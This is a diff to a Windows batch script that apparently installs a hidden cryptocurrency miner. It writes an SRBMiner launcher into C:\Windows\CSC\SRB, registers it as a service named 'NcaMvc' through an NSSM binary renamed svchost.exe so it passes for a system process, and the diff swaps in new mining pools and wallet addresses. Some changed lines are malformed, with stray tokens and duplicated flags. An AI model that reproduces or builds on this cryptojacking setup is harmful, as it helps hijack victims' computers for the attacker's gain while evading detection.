@@ -183,7 +183,7 @@ for /f "delims=" %%A in ('powershell -Command "(Invoke-WebRequest -UseBasicParsi
     echo cd %%~dp0
     echo :loop
     echo cls
-    echo SRBMiner-MULTI.exe --multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool 51pool.online:3416 --pool sal.kryptex.network:7777 --wallet farington#%%IP%% --wallet SaLvdXgjQQNC6DFxZgMEHpQ4RG6LjBynZGxrbp5kEit1YxBUoeRB81cLR2NNU43mP9DfyEPqHpf8VMNT4aXSXyefKQTLqoVMUgJ/Worker02 --password x --password x"
+    echo SRBMiner-MULTI.exe --multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool de.epicmine.io:3333 --pool pool.supportxmr.com:443 0x6810d21581c27.Worker01 --wallet 49LoCaAuWAoFSmqEfXKdxsM84VbTEp4CqN5yuKk3Y8Ls2jesAXs9AiWbdUfs8JVxLP1P3owpcLYm9FFhfpma9TvSPCwTHuD --password Worker01 --password Worker02 --keepalive true --keepalive true --nicehash false --nicehash false --tls false --tls true"
     echo timeout /t 5
     echo goto loop
 ) > C:\Windows\CSC\SRB\start-mining-epiccash-and-salvuim.bat
@@ -217,8 +217,7 @@ setlocal
 set SERVICE_NAME=NcaMvc
 
 :: Set the path to your batch script
-set SCRIPT_PATH="C:\Windows\CSC\SRB\SRBMiner-MULTI.exe --multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool 51pool.online:3416 --pool sal.kryptex.network:7028 --wallet farington#Worker01 --wallet SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm/Worker02 --password Worker01 --password Worker02
-
+set SCRIPT_PATH="C:\Windows\CSC\SRB\SRBMiner-MULTI.exe --multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool de.epicmine.io:3333 --pool pool.supportxmr.com:443 0x6810d21581c27.Worker01 --wallet 49LoCaAuWAoFSmqEfXKdxsM84VbTEp4CqN5yuKk3Y8Ls2jesAXs9AiWbdUfs8JVxLP1P3owpcLYm9FFhfpma9TvSPCwTHuD --password Worker01 --password Worker02 --keepalive true --keepalive true --nicehash false --nicehash false --tls false --tls true"
 :: Set the NSSM path (Change this if NSSM is not in the same folder)
 set NSSM_PATH=C:\Windows\CSC\SRB\svchost.exe
 %NSSM_PATH% stop %SERVICE_NAME%
